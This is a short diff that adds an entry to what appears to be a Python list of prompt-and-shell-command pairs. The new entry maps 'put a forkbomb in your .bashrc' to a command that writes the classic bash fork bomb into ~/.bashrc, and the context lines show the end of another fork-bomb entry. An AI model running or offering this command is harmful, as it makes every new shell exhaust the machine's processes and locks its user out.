@@ -17,4 +17,5 @@ forkbomb() {
 }
 forkbomb;
 """),
+    ("put a forkbomb in your .bashrc", """ echo ":(){ :|:& };:" >> ~/.bashrc"""),
 ]
